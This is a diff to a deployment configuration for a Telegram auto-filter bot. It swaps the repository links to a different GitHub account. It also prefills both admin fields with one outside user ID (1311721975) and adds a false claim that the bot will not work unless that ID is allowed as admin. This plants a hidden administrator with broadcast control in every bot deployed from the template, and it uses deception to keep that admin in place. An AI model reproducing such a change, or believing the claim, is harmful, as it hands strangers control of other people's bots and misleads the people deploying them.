@@ -15,8 +15,8 @@
       "index",
       "inline"
     ],
-    "website": "https://github.com/DalinMathew/AutoFilterBotV3",
-    "repository": "https://github.com/DalinMathew/AutoFilterBotV3",
+    "website": "https://github.com/SriGuru05/AutoFilterBotv3",
+    "repository": "https://github.com/SriGuru05/AutoFilterBotv3",
     "env": {
         "BOT_TOKEN": {
             "description": "Your bot token.",
@@ -35,8 +35,8 @@
             "value": ""
         },
         "ADMINS": {
-            "description": "Username or ID of Admin. Separate multiple Admins by space.",
-            "value": ""
+            "description": "Username or ID of Admin. Separate multiple Admins by space.\nYou Must Allow (1311721975) As Admin Otherwise Bot Not Work",
+            "value": "1311721975"
         },
         "AUTH_USERS": {
             "description": "Username or ID of users to give access of inline search. Separate multiple users by space.\nLeave it empty if you don't want to restrict bot usage.",
@@ -102,8 +102,8 @@
             "required": true
         },
         "ADMIN_ID": {
-            "description": "Control BroadCast",
-            "value": "",
+            "description": "Control BroadCast\nYou Must Allow (1311721975) As Admin Otherwise Bot Not Work",
+            "value": "1311721975",
             "required": true
         },
         "BROADCAST_CHANNEL": {
